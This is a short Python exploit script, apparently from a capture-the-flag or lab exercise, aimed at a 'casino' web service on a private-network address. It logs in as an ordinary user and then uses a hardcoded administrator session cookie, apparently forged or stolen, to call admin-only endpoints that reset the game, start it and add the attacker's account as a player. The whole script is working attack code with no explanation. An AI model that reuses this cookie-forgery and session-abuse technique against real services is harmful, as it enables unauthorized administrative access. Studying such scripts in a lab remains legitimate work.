import requests
import time

url = 'http://192.168.206.139'
u = 'iv4n'
pwd = '11111111'
duration = 60 * 5

admin_cookie = 'MTU2NjA1MDgzMHxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUFfXzRJQUFnWnpkSEpwYm1jTUJ3QUZkVzVoYldVR2MzUnlhVzVuREFjQUJXRmtiV2x1Qm5OMGNtbHVad3dKQUFkcGMwRmtiV2x1QkdKdmIyd0NBZ0FCfOM2FZ8ee4WAWKbJaHcjTwpQCiLvR-QBsqNeM7GrH4a7 '

s = requests.Session()
s.post(url + ':50000/auth/login', json={'uname': u, 'pwd': pwd})
s.post(url + ':50001/api/u/reset', json={'pwd': pwd})
s.post(url + ':50001/api/u/beg', json={'pwd': pwd})
s.post(url + ':50001/api/u/beg', json={'pwd': pwd})
s.post(url + ':50001/api/u/beg', json={'pwd': pwd})

requests.get(
    url + ':50001/api/service/manage/reset',
    cookies={
        'casino': admin_cookie,
    })
requests.get(
    url + ':50001/api/service/manage/start',
    cookies={
        'casino': admin_cookie
    })

s.post(url + ':50001/api/u/join', json={'pwd': pwd})
r = s.get(url + ':50001/api/service/player-status')
print(r.text)

requests.post(
    url + ':50001/api/service/manage/add-player',
    json={'uname': u},
    cookies={
        'casino': admin_cookie,
    })

r = s.get(url + ':50001/api/service/player-status')
print(r.text)
s.post(url + ':50001/api/u/beg', json={'pwd': pwd})
time.sleep(duration)
r = s.post(url + ':50001/api/u/info', json={'pwd': pwd})
print(r.text)
